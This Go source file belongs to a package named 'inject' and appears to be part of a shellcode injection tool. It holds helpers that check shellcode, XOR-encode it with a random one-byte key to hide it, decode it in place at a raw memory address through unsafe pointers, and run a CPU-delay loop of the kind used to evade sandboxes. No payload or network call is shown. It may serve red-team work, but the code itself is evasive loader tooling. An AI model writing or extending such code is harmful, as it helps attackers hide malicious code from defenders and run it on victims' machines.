package inject

import (
	"crypto/rand"
	"fmt"
	"unsafe"
)

func validateShellcode(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}
	return nil
}

func xorEncodeShellcode(shellcode []byte) (encoded []byte, key byte, err error) {
	xorKey := make([]byte, 1)
	_, err = rand.Read(xorKey)
	if err != nil {
		return nil, 0, fmt.Errorf("failed to generate XOR key: %w", err)
	}
	key = xorKey[0]

	encoded = make([]byte, len(shellcode))
	copy(encoded, shellcode)
	for i := range encoded {
		encoded[i] ^= key
	}

	return encoded, key, nil
}

func xorDecodeInPlace(addr uintptr, size int, key byte) {
	for i := 0; i < size; i++ {
		ptr := (*byte)(unsafe.Pointer(addr + uintptr(i)))
		*ptr ^= key
	}
}

func cpuDelay() {
	cfg := DefaultCPUDelayConfig()
	cpuDelayN(cfg.MaxIterations, cfg.FallbackIterations)
}
